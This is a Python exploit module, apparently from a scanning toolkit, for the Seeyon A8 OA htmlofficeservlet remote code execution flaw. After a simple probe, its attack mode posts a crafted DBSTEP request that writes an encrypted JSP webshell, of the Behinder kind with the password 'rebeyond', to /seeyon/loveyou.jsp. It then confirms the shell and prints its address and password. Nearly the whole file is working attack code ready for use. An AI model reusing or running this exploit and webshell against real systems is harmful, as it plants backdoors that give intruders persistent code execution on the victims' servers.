# -*- coding: utf-8 -*-

from poc import core
import base64
import urllib.parse


def check(url, attack):
    name = 'A8 htmlofficeservlet RCE漏洞'
    path = '/seeyon/htmlofficeservlet'
    core.start_echo(name)
    r = core.get(url, path)
    if r:
        if r.status_code == 200 and 'htmoffice' in r.text:
            if attack:
                get_shell(url, path, name)
            else:
                core.end_echo('可能' + name, url + path)
                core.result('可能存在' + name, url + path)
        else:
            core.end_echo(name)
    else:
        core.end_echo(name)


def get_shell(url, path, name):
    print('\033[32m[#]开始写入webshell\033[0m')
    payload = ("\n"
           "DBSTEP V3.0     400             0               1392             DBSTEP=OKMLlKlV\r\n"
           "OPTION=S3WYOSWLBSGr\r\n"
           "currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\n"
           "CREATEDATE=wUghPB3szB3Xwg66\r\n"
           "RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\n"
           "originalFileId=wV66\r\n"
           "originalCreateDate=wUghPB3szB3Xwg66\r\n"
           "FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdc1DAyaQvNBT2dEg6\r\n"
           "needReadFile=yRWZdAS6\r\n"
           "originalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n"
           "////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////\r\n"
           "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";/*åÆ¥:Þ¥Æ32Mmd5<M16MØ¤Þ¥Ærebeyond*/session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>testtesttesttesttesttesttesttesttesttesttes\n")
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    r = core.post(url, path, header, payload)
    if r:
        r = core.get(url, '/seeyon/loveyou.jsp')
        if r:
            if "testtest" in r.text:
                print('\033[32m[#]成功写入webshell\033[0m')
                core.end_echo(name, 'webshell地址：' + url + '/seeyon/loveyou.jsp' + '密码：rebeyond')
                core.result(name, url + '/seeyon/loveyou.jsp' + '密码：rebeyond')
            else:
                print('\033[32m[#]写入webshell失败\033[0m')
                core.end_echo(name)
        else:
            print('\033[32m[#]写入webshell失败\033[0m')
            core.end_echo(name)
    else:
        print('\033[32m[#]写入webshell失败\033[0m')
        core.end_echo(name)
